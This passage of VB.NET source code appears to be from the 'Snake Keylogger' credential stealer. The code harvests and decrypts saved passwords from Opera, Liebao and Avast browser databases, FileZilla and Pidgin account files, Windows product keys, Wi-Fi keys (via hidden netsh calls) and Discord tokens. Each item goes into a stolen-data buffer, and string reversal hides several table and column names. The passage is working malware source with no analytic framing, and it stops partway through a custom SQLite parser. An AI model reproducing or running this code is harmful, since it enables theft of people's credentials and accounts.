        Public cbSize As Integer
        Public dwPromptFlags As CryptProtectPromptFlags
        Public hwndApp As IntPtr
        Public szPrompt As String
    End Structure
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure
    Function Decrypttttt(ByVal Datas() As Byte) As String
        Dim inj, Ors As New DATA_BLOB
        Dim Ghandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
        inj.pbData = Ghandle.AddrOfPinnedObject()
        inj.cbData = Datas.Length
        Ghandle.Free()
        CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
        Dim Returned() As Byte = New Byte(Ors.cbData) {}
        Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
        Dim TheString As String = Encoding.Default.GetString(Returned)
        Return TheString.Substring(0, TheString.Length - 1)
    End Function

#End Region

#Region "Opera"

    Private opera_salt As Byte() = {&H83, &H7D, &HFC, &HF, &H8E, &HB3,
    &HE8, &H69, &H73, &HAF, &HFF}
    Private key_size As Byte() = {&H0, &H0, &H0, &H8}
    Private pathsss As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Public DOutput As String
    Dim Opass As String
    Public Sub COVIDSTOpera()
        If File.Exists(pathsss + Strings.StrReverse("ataD nigoL\elbatS arepO\erawtfoS arepO\")) Then
            pathsss += Strings.StrReverse("ataD nigoL\elbatS arepO\erawtfoS arepO\")
        ElseIf File.Exists(pathsss + Strings.StrReverse("tad.dnaw\eliforp\arepO\arepO\")) Then
            pathsss += Strings.StrReverse("tad.dnaw\eliforp\arepO\arepO\")
        End If
        Try
            Dim obj As Object = New SQLiteHandler(pathsss)
            NewLateBinding.LateCall(obj, Nothing, "ReadTable", New Object() {Strings.StrReverse("snigol")}, Nothing, Nothing, Nothing, True)
            If File.Exists(pathsss) Then
                Dim num As Integer = 0
                Dim num2 As Integer = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(obj, Nothing, "GetRowCount", New Object(-1) {}, Nothing, Nothing, Nothing), 1))
                For i As Integer = num To num2
                    Dim instance As Object = obj
                    Dim type As Type = Nothing
                    Dim memberName As String = "GetValue"
                    Dim array As Object() = New Object() {i, Strings.StrReverse("lru_nigiro")}
                    Dim arguments As Object() = array
                    Dim argumentNames As String() = Nothing
                    Dim typeArguments As Type() = Nothing
                    Dim array2 As Boolean() = New Boolean() {True, False}
                    Dim value As Object = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array2)
                    If array2(0) Then
                        i = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array(0)), GetType(Integer)))
                    End If
                    Dim text As String = Conversions.ToString(value)
                    Dim instance2 As Object = obj
                    Dim type2 As Type = Nothing
                    Dim memberName2 As String = "GetValue"
                    Dim array3 As Object() = New Object() {i, Strings.StrReverse("eulav_emanresu")}
                    Dim arguments2 As Object() = array3
                    Dim argumentNames2 As String() = Nothing
                    Dim typeArguments2 As Type() = Nothing
                    array2 = New Boolean() {True, False}
                    Dim value2 As Object = NewLateBinding.LateGet(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array2)
                    If array2(0) Then
                        i = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3(0)), GetType(Integer)))
                    End If
                    Dim text2 As String = Conversions.ToString(value2)
                    Dim [default] As Object = Encoding.[Default]
                    Dim type3 As Type = Nothing
                    Dim memberName3 As String = "GetBytes"
                    Dim array4 As Object() = New Object(0) {}
                    Dim array5 As Object() = array4
                    Dim num3 As Integer = 0
                    Dim obj2 As Object = obj
                    Dim instance3 As Object = obj2
                    Dim type4 As Type = Nothing
                    Dim memberName4 As String = "GetValue"
                    array = New Object(1) {}
                    array(0) = i
                    Dim array6 As Object() = array
                    Dim num4 As Integer = 1
                    Dim text3 As String = Strings.StrReverse("eulav_drowssap")
                    array6(num4) = text3
                    array3 = array
                    Dim arguments3 As Object() = array3
                    Dim argumentNames3 As String() = Nothing
                    Dim typeArguments3 As Type() = Nothing
                    array2 = New Boolean() {True, False}
                    Dim obj3 As Object = NewLateBinding.LateGet(instance3, type4, memberName4, arguments3, argumentNames3, typeArguments3, array2)
                    If array2(0) Then
                        i = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3(0)), GetType(Integer)))
                    End If
                    array5(num3) = RuntimeHelpers.GetObjectValue(obj3)
                    Dim array7 As Object() = array4
                    Dim arguments4 As Object() = array7
                    Dim argumentNames4 As String() = Nothing
                    Dim typeArguments4 As Type() = Nothing
                    Dim array8 As Boolean() = New Boolean() {True}
                    Dim obj4 As Object = NewLateBinding.LateGet([default], type3, memberName3, arguments4, argumentNames4, typeArguments4, array8)
                    If array8(0) Then
                        NewLateBinding.LateSetComplex(obj2, Nothing, "GetValue", New Object() {i, text3, RuntimeHelpers.GetObjectValue(array7(0))}, Nothing, Nothing, True, False)
                    End If
                    Dim text4 As String = Decrypttttt(CType(obj4, Byte()))
                    If Operators.CompareString(text2, "", False) <> 0 And Operators.CompareString(text4, "", False) <> 0 Then
                        Dim Opass = String.Concat(New String() {vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Opera" & vbCrLf & "Host: ", text, vbCrLf & "USR: ", text2, vbCrLf & "PSWD: ", text4, vbNewLine + "---------------------------------" + vbNewLine + " "})
                        '  WPEㅘPGWHNM.SWySKyㅡؤㅢKuO += ㅛSοעEEy.Opass
                        COVID19.StoragePW += Opass
                    End If
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub


    Function FLww(ByVal s As String) As String
        Dim f As String = "abcdefghijklmnopqrstuvwxyz1234567890_-.~!@#$%^&*()[{]}\|';:,<>/?+="
        Dim w As String = ""
        For Each xx As String In s
            If f.Contains(xx.ToLower) Then
                w &= xx
            End If
        Next
        Return w
    End Function
    Public Function decrypt2_method(ByVal key As Byte(), ByVal encrypt_data As Byte())
        Try
            Dim md5Cryptt As New MD5CryptoServiceProvider()
            md5Cryptt.Initialize()
            Dim tmpBuffer As Byte() = New Byte(opera_salt.Length + (key.Length - 1)) {}
            Array.Copy(opera_salt, tmpBuffer, opera_salt.Length)
            Array.Copy(key, 0, tmpBuffer, opera_salt.Length, key.Length)
            Dim hash1 As Byte() = md5Cryptt.ComputeHash(tmpBuffer)
            tmpBuffer = New Byte(hash1.Length + opera_salt.Length + (key.Length - 1)) {}
            Array.Copy(hash1, tmpBuffer, hash1.Length)
            Array.Copy(opera_salt, 0, tmpBuffer, hash1.Length, opera_salt.Length)
            Array.Copy(key, 0, tmpBuffer, hash1.Length + opera_salt.Length, key.Length)
            Dim hash2 As Byte() = md5Cryptt.ComputeHash(tmpBuffer)
            Dim tripleDESss As New TripleDESCryptoServiceProvider()
            tripleDESss.Mode = CipherMode.CBC
            tripleDESss.Padding = PaddingMode.None
            Dim tripleKey As Byte() = New Byte(23) {}
            Dim IV As Byte() = New Byte(7) {}
            Array.Copy(hash1, tripleKey, hash1.Length)
            Array.Copy(hash2, 0, tripleKey, hash1.Length, 8)
            Array.Copy(hash2, 8, IV, 0, 8)
            tripleDESss.Key = tripleKey
            tripleDESss.IV = IV
            Dim decryter As ICryptoTransform = tripleDESss.CreateDecryptor()
            Dim output2121 As Byte() = decryter.TransformFinalBlock(encrypt_data, 0, encrypt_data.Length)
            Dim enc22 As String = Encoding.Unicode.GetString(output2121)
            Return enc22
        Catch e As Exception
            Return ""
        End Try
    End Function
#End Region


#Region "FileZilla FTP"

    Function COVIDSTFileZilla() As String

        '   On Error Resume Next   
        Dim FilePatheee As String = Environ("APPDATA") & "\FileZilla\recentservers.xml"
        Try
            Dim doc As New System.Xml.XmlDocument
            doc.Load(FilePatheee)
            Dim list = doc.GetElementsByTagName("Host")
            Dim list1 = doc.GetElementsByTagName("User")
            Dim list2 = doc.GetElementsByTagName("Pass")
            Dim list3 = doc.GetElementsByTagName("Port")
            Dim paswo = ""
            Dim users = ""
            Dim hostt = ""
            Dim portss = ""
            For Each item As System.Xml.XmlElement In list
                hostt = item.InnerText
            Next
            For Each item1 As System.Xml.XmlElement In list1
                users = item1.InnerText
            Next
            For Each item2 As System.Xml.XmlElement In list2
                paswo = item2.InnerText
            Next
            For Each item3 As System.Xml.XmlElement In list3
                portss = item3.InnerText
            Next
            Dim Output As String = Nothing
            Dim Data = System.Convert.FromBase64String(paswo.ToString)
            paswo = System.Text.ASCIIEncoding.ASCII.GetString(Data)
            Output = vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: FileZilla" & vbNewLine & "Host: " + hostt + vbNewLine + "Username: " + users + vbNewLine + "Password: " + paswo + vbNewLine + "Port: " + portss + vbNewLine + "---------------------------------" + vbNewLine + ""

            COVID19.StoragePW += Output

        Catch ex As Exception
        End Try

    End Function
#End Region


#Region "Pidgin & Liebao & Avast"
    Public Sub COVIDSTPidgin()
        Dim xmlDocument As XmlDocument = New XmlDocument()
        Dim text As String = Interaction.Environ("AppData") + "\.purple\accounts.xml"
        If File.Exists(text) Then
            Try
                xmlDocument.Load(text)
                Dim elementsByTagName As XmlNodeList = xmlDocument.GetElementsByTagName("protocol")
                Dim elementsByTagName2 As XmlNodeList = xmlDocument.GetElementsByTagName("name")
                Dim elementsByTagName3 As XmlNodeList = xmlDocument.GetElementsByTagName("password")
                Dim num As Integer = 0
                Dim num2 As Integer = elementsByTagName.Count - 1
                For i As Integer = num To num2
                    Dim right As Object = String.Concat(New String() {vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Pidgin" & vbCrLf & "Protocol: ", elementsByTagName(i).InnerText, vbCrLf & "Username: ", elementsByTagName2(i).InnerText, vbCrLf & "Password: ", elementsByTagName3(i).InnerText, vbNewLine + "---------------------------------" + vbNewLine + ""})
                    COVID19.StoragePW = Conversions.ToString(Operators.AddObject(COVID19.StoragePW, right))
                Next
            Catch ex As Exception
            End Try
        End If
    End Sub

    Public Sub COVIDSTLiebao()
        Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Liebao7\User Data\Default\EncryptedStorage"
        Try
            Dim obj As Object = New SQLiteHandler(text)
            NewLateBinding.LateCall(obj, Nothing, "ReadTable", New Object() {"entries"}, Nothing, Nothing, Nothing, True)
            If File.Exists(text) Then
                Dim num As Integer = 0
                Dim num2 As Integer = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(obj, Nothing, "GetRowCount", New Object(-1) {}, Nothing, Nothing, Nothing), 1))
                For i As Integer = num To num2
                    Dim instance As Object = obj
                    Dim type As Type = Nothing
                    Dim memberName As String = "GetValue"
                    Dim array As Object() = New Object() {i, "str3"}
                    Dim arguments As Object() = array
                    Dim argumentNames As String() = Nothing
                    Dim typeArguments As Type() = Nothing
                    Dim array2 As Boolean() = New Boolean() {True, False}
                    Dim value As Object = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array2)
                    If array2(0) Then
                        i = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array(0)), GetType(Integer)))
                    End If
                    Dim text2 As String = Conversions.ToString(value)
                    Dim instance2 As Object = obj
                    Dim type2 As Type = Nothing
                    Dim memberName2 As String = "GetValue"
                    Dim array3 As Object() = New Object() {i, "str2"}
                    Dim arguments2 As Object() = array3
                    Dim argumentNames2 As String() = Nothing
                    Dim typeArguments2 As Type() = Nothing
                    array2 = New Boolean() {True, False}
                    Dim value2 As Object = NewLateBinding.LateGet(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array2)
                    If array2(0) Then
                        i = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3(0)), GetType(Integer)))
                    End If
                    Dim text3 As String = Conversions.ToString(value2)
                    Dim [default] As Object = Encoding.[Default]
                    Dim type3 As Type = Nothing
                    Dim memberName3 As String = "GetBytes"
                    Dim array4 As Object() = New Object(0) {}
                    Dim array5 As Object() = array4
                    Dim num3 As Integer = 0
                    Dim obj2 As Object = obj
                    Dim instance3 As Object = obj2
                    Dim type4 As Type = Nothing
                    Dim memberName4 As String = "GetValue"
                    array = New Object(1) {}
                    array(0) = i
                    Dim array6 As Object() = array
                    Dim num4 As Integer = 1
                    Dim text4 As String = "blob0"
                    array6(num4) = text4
                    array3 = array
                    Dim arguments3 As Object() = array3
                    Dim argumentNames3 As String() = Nothing
                    Dim typeArguments3 As Type() = Nothing
                    array2 = New Boolean() {True, False}
                    Dim obj3 As Object = NewLateBinding.LateGet(instance3, type4, memberName4, arguments3, argumentNames3, typeArguments3, array2)
                    If array2(0) Then
                        i = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3(0)), GetType(Integer)))
                    End If
                    array5(num3) = RuntimeHelpers.GetObjectValue(obj3)
                    Dim array7 As Object() = array4
                    Dim arguments4 As Object() = array7
                    Dim argumentNames4 As String() = Nothing
                    Dim typeArguments4 As Type() = Nothing
                    Dim array8 As Boolean() = New Boolean() {True}
                    Dim obj4 As Object = NewLateBinding.LateGet([default], type3, memberName3, arguments4, argumentNames4, typeArguments4, array8)
                    If array8(0) Then
                        NewLateBinding.LateSetComplex(obj2, Nothing, "GetValue", New Object() {i, text4, RuntimeHelpers.GetObjectValue(array7(0))}, Nothing, Nothing, True, False)
                    End If
                    Dim text5 As String = Decrypttttt(CType(obj4, Byte()))
                    If Operators.CompareString(text3, "", False) <> 0 And Operators.CompareString(text5, "", False) <> 0 Then
                        '         ㅛSοעEEy.llpass = String.Concat(New String() {"============Liebao==============" & vbCrLf & "Host: ", text2, vbCrLf & "Username: ", text3, vbCrLf & "Password: ", text5, vbCrLf & "=============================" & vbCrLf & " "})
                        Dim cPass = String.Concat(New String() {vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Liebao" & vbCrLf & "Host: ", text2, vbCrLf & "Username: ", text3, vbCrLf & "Password: ", text5, vbNewLine + "---------------------------------" + vbNewLine + ""})

                        ' WPEㅘPGWHNM.SWySKyㅡؤㅢKuO += ㅛSοעEEy.llpass

                        COVID19.StoragePW += cPass
                    End If
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public Sub COVIDSTavast()
        Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\AVAST Software\Browser\User Data\Default\Login Data"
        Try
            Dim obj As Object = New SQLiteHandler(text)
            NewLateBinding.LateCall(obj, Nothing, "ReadTable", New Object() {Strings.StrReverse("snigol")}, Nothing, Nothing, Nothing, True)
            If File.Exists(text) Then
                Dim num As Integer = 0
                Dim num2 As Integer = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(obj, Nothing, "GetRowCount", New Object(-1) {}, Nothing, Nothing, Nothing), 1))
                For i As Integer = num To num2
                    Dim instance As Object = obj
                    Dim type As Type = Nothing
                    Dim memberName As String = "GetValue"
                    Dim array As Object() = New Object() {i, Strings.StrReverse("lru_nigiro")}
                    Dim arguments As Object() = array
                    Dim argumentNames As String() = Nothing
                    Dim typeArguments As Type() = Nothing
                    Dim array2 As Boolean() = New Boolean() {True, False}
                    Dim value As Object = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array2)
                    If array2(0) Then
                        i = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array(0)), GetType(Integer)))
                    End If
                    Dim text2 As String = Conversions.ToString(value)
                    Dim instance2 As Object = obj
                    Dim type2 As Type = Nothing
                    Dim memberName2 As String = "GetValue"
                    Dim array3 As Object() = New Object() {i, Strings.StrReverse("eulav_emanresu")}
                    Dim arguments2 As Object() = array3
                    Dim argumentNames2 As String() = Nothing
                    Dim typeArguments2 As Type() = Nothing
                    array2 = New Boolean() {True, False}
                    Dim value2 As Object = NewLateBinding.LateGet(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array2)
                    If array2(0) Then
                        i = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3(0)), GetType(Integer)))
                    End If
                    Dim text3 As String = Conversions.ToString(value2)
                    Dim [default] As Object = Encoding.[Default]
                    Dim type3 As Type = Nothing
                    Dim memberName3 As String = "GetBytes"
                    Dim array4 As Object() = New Object(0) {}
                    Dim array5 As Object() = array4
                    Dim num3 As Integer = 0
                    Dim obj2 As Object = obj
                    Dim instance3 As Object = obj2
                    Dim type4 As Type = Nothing
                    Dim memberName4 As String = "GetValue"
                    array = New Object(1) {}
                    array(0) = i
                    Dim array6 As Object() = array
                    Dim num4 As Integer = 1
                    Dim text4 As String = Strings.StrReverse("eulav_drowssap")
                    array6(num4) = text4
                    array3 = array
                    Dim arguments3 As Object() = array3
                    Dim argumentNames3 As String() = Nothing
                    Dim typeArguments3 As Type() = Nothing
                    array2 = New Boolean() {True, False}
                    Dim obj3 As Object = NewLateBinding.LateGet(instance3, type4, memberName4, arguments3, argumentNames3, typeArguments3, array2)
                    If array2(0) Then
                        i = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3(0)), GetType(Integer)))
                    End If
                    array5(num3) = RuntimeHelpers.GetObjectValue(obj3)
                    Dim array7 As Object() = array4
                    Dim arguments4 As Object() = array7
                    Dim argumentNames4 As String() = Nothing
                    Dim typeArguments4 As Type() = Nothing
                    Dim array8 As Boolean() = New Boolean() {True}
                    Dim obj4 As Object = NewLateBinding.LateGet([default], type3, memberName3, arguments4, argumentNames4, typeArguments4, array8)
                    If array8(0) Then
                        NewLateBinding.LateSetComplex(obj2, Nothing, "GetValue", New Object() {i, text4, RuntimeHelpers.GetObjectValue(array7(0))}, Nothing, Nothing, True, False)
                    End If
                    Dim text5 As String = Decrypttttt(CType(obj4, Byte()))
                    If Operators.CompareString(text3, "", False) <> 0 And Operators.CompareString(text5, "", False) <> 0 Then
                        Dim cPass = String.Concat(New String() {vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Avast" & vbCrLf & "Host: ", text2, vbCrLf & "Username: ", text3, vbCrLf & "Password: ", text5, vbNewLine + "---------------------------------" + vbNewLine + ""})
                        COVID19.StoragePW += cPass
                    End If
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub
#End Region


#Region "Windows Product Key"
    Public Function ThewinProductss() As String

        Dim strkey As String = ""
        Try
            Dim RegKey As RegistryKey =
            Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion", False)
            Dim bytDPID() As Byte = RegKey.GetValue("DigitalProductID")



            Dim bytKey(14) As Byte
            Array.Copy(bytDPID, 52, bytKey, 0, 15)


            Dim strChar As String = "BCDFGHJKMPQRTVWXY2346789"

            For j As Integer = 0 To 24
                Dim nCur As Short = 0
                For i As Integer = 14 To 0 Step -1
                    nCur = CShort(nCur * 256 Xor bytKey(i))
                    bytKey(i) = CByte(Int(nCur / 24))
                    nCur = CShort(nCur Mod 24)
                Next
                strkey = strChar.Substring(nCur, 1) & strkey
            Next
            For i As Integer = 4 To 1 Step -1
                strkey = strkey.Insert(i * 5, "-")
            Next


        Catch ex As Exception
        End Try
        Return strkey
    End Function
    Public Sub WindowsProductKey_Orginal()
        ThewinProductss()
        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Product Key: Windows" & vbNewLine & "Key: " & ThewinProductss() & vbNewLine & "---------------------------------")
        COVID19.StoragePW += cPass
    End Sub
#End Region


#Region "WiFi Recovery"
    Public TheWiFisOutput As String = ""
    Public count As Integer = 0
    Public count_names As Integer = 0
    Private Sub parse_lines(ByVal input As String)
        Using reader As StringReader = New StringReader(input)
            Dim line As String

            While (Assign(line, reader.ReadLine())) IsNot Nothing
                count += 1
                regex_lines(line)
            End While
        End Using
    End Sub

    Public Sub TheWiFi_Orginal()
        get_passwords()
        If TheWiFisOutput = "" Then
        Else
            COVID19.StoragePW += "======== WiFi Recovered ========" + vbNewLine + vbNewLine + TheWiFisOutput + vbNewLine + "======= End =======" + vbNewLine + "  "

        End If

    End Sub

    Private Sub regex_lines(ByVal input2 As String)
        Dim regex1 As Regex = New Regex("All User Profile * : (?<after>.*)")
        Dim match1 As Match = regex1.Match(input2)

        If match1.Success Then
            count_names += 1
            Dim current_name As String = match1.Groups("after").Value
            Dim password As String = wifipassword_single(current_name) & vbNewLine + "==============="
            'table.Rows.Add(count_names, current_name, password)
            TheWiFisOutput += String.Format("{0}{1}", "WiFi Name: " + current_name.PadRight(20), vbNewLine + "Password:  " + password) & vbCrLf
        End If
    End Sub
    Public Function wifipassword(ByVal wifiname As String) As String
        Dim argument As String = "wlan show profile name=""" & wifiname & """ key=clear"
        Dim processWifi As Process = New Process()
        processWifi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
        processWifi.StartInfo.FileName = "netsh"
        processWifi.StartInfo.Arguments = argument
        processWifi.StartInfo.UseShellExecute = False
        processWifi.StartInfo.RedirectStandardError = True
        processWifi.StartInfo.RedirectStandardInput = True
        processWifi.StartInfo.RedirectStandardOutput = True
        processWifi.StartInfo.CreateNoWindow = True
        processWifi.Start()
        Dim output As String = processWifi.StandardOutput.ReadToEnd()
        Dim err As String = processWifi.StandardError.ReadToEnd()
        processWifi.WaitForExit()
        Return output

    End Function
    Public Function wifilist() As String
        Dim processWifi As Process = New Process()
        processWifi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
        processWifi.StartInfo.FileName = "netsh"
        processWifi.StartInfo.Arguments = "wlan show profile"
        processWifi.StartInfo.UseShellExecute = False
        processWifi.StartInfo.RedirectStandardError = True
        processWifi.StartInfo.RedirectStandardInput = True
        processWifi.StartInfo.RedirectStandardOutput = True
        processWifi.StartInfo.CreateNoWindow = True
        processWifi.Start()
        Dim output As String = processWifi.StandardOutput.ReadToEnd()
        Dim err As String = processWifi.StandardError.ReadToEnd()
        processWifi.WaitForExit()
        Return output


    End Function

    Public Function wifipassword_single(ByVal wifiname As String) As String


        Dim get_password As String = wifipassword(wifiname)

        Using reader As StringReader = New StringReader(get_password)
            Dim line As String

            While (Assign(line, reader.ReadLine())) IsNot Nothing
                Dim regex2 As Regex = New Regex("Key Content * : (?<after>.*)")
                Dim match2 As Match = regex2.Match(line)

                If match2.Success Then
                    Dim current_password As String = match2.Groups("after").Value
                    Return current_password
                End If
            End While
        End Using

        Return "Open Network"
    End Function

    <Obsolete("Please refactor calling code to use normal Visual Basic assignment")>
    Function Assign(Of T)(ByRef target As T, value As T) As T
        target = value
        Return value
    End Function
    Private Sub get_passwords()
        Dim wifidata As String = wifilist()
        parse_lines(wifidata)
    End Sub
#End Region


#Region "Discord Recovery"


    Public Sub COVIDSTDiscord()
        Try
            Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\discord\Local Storage\leveldb\"
            Dim flag As Boolean = Not COVIDPickers.dotldb(text) AndAlso Not COVIDPickers.dotldb(text)
            If flag Then
            End If
            Thread.Sleep(100)
            Dim text2 As String = COVIDPickers.tokenx(text, text.EndsWith(".log"))
            Dim flag2 As Boolean = text2 = ""
            If flag2 Then
                text2 = "N/A"
            End If

            Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Discord" & vbNewLine & "Token: " & text2 & vbNewLine & vbNewLine + "---------------------------------" + vbNewLine + " ")
            COVID19.StoragePW += cPass
        Catch ex As Exception
        End Try
    End Sub

    Private Function dotldb(ByRef stringx As String) As Boolean
        Dim flag As Boolean = Directory.Exists(stringx)
        Dim result As Boolean
        If flag Then
            For Each fileInfo As FileInfo In New DirectoryInfo(stringx).GetFiles()
                Dim flag2 As Boolean = fileInfo.Name.EndsWith(".ldb") AndAlso File.ReadAllText(fileInfo.FullName).Contains("oken")
                If flag2 Then
                    stringx += fileInfo.Name
                    Return stringx.EndsWith(".ldb")
                End If
            Next
            result = stringx.EndsWith(".ldb")
        Else
            result = False
        End If
        Return result
    End Function
    Private Function IndexOf(stringx As String) As String
        Dim array As String() = stringx.Substring(stringx.IndexOf("oken") + 4).Split(New Char() {""""c})
        Dim list As List(Of String) = New List(Of String)()
        list.AddRange(array)
        list.RemoveAt(0)
        array = list.ToArray()
        Return String.Join("""", array)
    End Function

    Private Function tokenx(stringx As String, Optional boolx As Boolean = False) As String
        Dim bytes As Byte() = File.ReadAllBytes(stringx)
        Dim [string] As String = Encoding.UTF8.GetString(bytes)
        Dim text As String = ""
        Dim text2 As String = [string]
        While text2.Contains("oken")
            Dim array As String() = COVIDPickers.IndexOf(text2).Split(New Char() {""""c})
            text = array(0)
            text2 = String.Join("""", array)
            Dim flag As Boolean = boolx AndAlso text.Length = 59
            If flag Then
                Exit While
            End If
        End While
        Return text
    End Function
#End Region

#End Region


End Module

#Region "SQLiteHandler"


Public Class SQLiteHandler
    Private db_bytes() As Byte
    Private page_size As UInt16
    Private encoding As UInt64
    Private master_table_entries() As sqlite_master_entry

    Private SQLDataTypeSize() As Byte = New Byte() {0, 1, 2, 3, 4, 6, 8, 8, 0, 0}
    Private table_entries() As table_entry
    Private field_names() As String

    Private Structure record_header_field
        Dim size As Int64
        Dim type As Int64
    End Structure

    Private Structure table_entry
        Dim row_id As Int64
        Dim content() As String
    End Structure

    Private Structure sqlite_master_entry
        Dim row_id As Int64
        Dim item_type As String
        Dim item_name As String
        Dim astable_name As String
        Dim root_num As Int64
        Dim sql_statement As String
    End Structure
    Private Function GVL(ByVal startIndex As Integer) As Integer
        On Error Resume Next
        If startIndex > db_bytes.Length Then Return Nothing

        For i As Integer = startIndex To startIndex + 8 Step 1
            If i > db_bytes.Length - 1 Then
                Return Nothing
            ElseIf (db_bytes(i) And &H80) <> &H80 Then
                Return i
            End If
        Next

        Return startIndex + 8
    End Function
    Private Function CVL(ByVal startIndex As Integer, ByVal endIndex As Integer) As Int64
        On Error Resume Next
        endIndex = endIndex + 1

        Dim retus(7) As Byte
        Dim Length = endIndex - startIndex
        Dim Bit64 As Boolean = False

        If Length = 0 Or Length > 9 Then Return Nothing
        If Length = 1 Then
            retus(0) = (db_bytes(startIndex) And &H7F)
            Return BitConverter.ToInt64(retus, 0)
        End If

        If Length = 9 Then
            Bit64 = True
        End If

        Dim j As Integer = 1
        Dim k As Integer = 7
        Dim y As Integer = 0

        If Bit64 Then
            retus(0) = db_bytes(endIndex - 1)
            endIndex = endIndex - 1
            y = 1
        End If

        For i As Integer = (endIndex - 1) To startIndex Step -1
            If (i - 1) >= startIndex Then
                retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j)) Or (db_bytes(i - 1) << k)
                j = j + 1
                y = y + 1
                k = k - 1
            Else
                If Not Bit64 Then retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j))
            End If
        Next

        Return BitConverter.ToInt64(retus, 0)
    End Function
    Private Function IsOdd(ByVal value As Int64) As Boolean
        Return (value And 1) = 1
    End Function
    Private Function ConvertToInteger(ByVal startIndex As Integer, ByVal Size As Integer) As UInt64
        On Error Resume Next
        If Size > 8 Or Size = 0 Then Return Nothing

        Dim retVal As UInt64 = 0

        For i As Integer = 0 To Size - 1 Step 1
            retVal = ((retVal << 8) Or db_bytes(startIndex + i))
        Next

        Return retVal
    End Function

    Private Sub ReadMasterTable(ByVal Offset As UInt64)
        On Error Resume Next
        If db_bytes(Offset) = &HD Then

            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
            Dim ol As Integer = 0

            If Not master_table_entries Is Nothing Then
                ol = master_table_entries.Length
                ReDim Preserve master_table_entries(master_table_entries.Length + Length)
            Else
                ReDim master_table_entries(Length)
            End If

            Dim ent_offset As UInt64

            For i As Integer = 0 To Length Step 1
                ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)

                If Offset <> 100 Then ent_offset = ent_offset + Offset


                Dim t = GVL(ent_offset)
                Dim size As Int64 = CVL(ent_offset, t)

                Dim s = GVL(ent_offset + (t - ent_offset) + 1)
                master_table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)


                ent_offset = ent_offset + (s - ent_offset) + 1


                t = GVL(ent_offset)
                s = t
                Dim Rec_Header_Size As Int64 = CVL(ent_offset, t)

                Dim Field_Size(4) As Int64


                For j As Integer = 0 To 4 Step 1
                    t = s + 1
                    s = GVL(t)
                    Field_Size(j) = CVL(t, s)

                    If Field_Size(j) > 9 Then
                        If IsOdd(Field_Size(j)) Then
                            Field_Size(j) = (Field_Size(j) - 13) / 2
                        Else
                            Field_Size(j) = (Field_Size(j) - 12) / 2
                        End If
                    Else
                        Field_Size(j) = SQLDataTypeSize(Field_Size(j))
                    End If
                Next

                If encoding = 1 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                End If
                If encoding = 1 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                End If

                master_table_entries(ol + i).root_num = ConvertToInteger(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2), Field_Size(3))
                If encoding = 1 Then
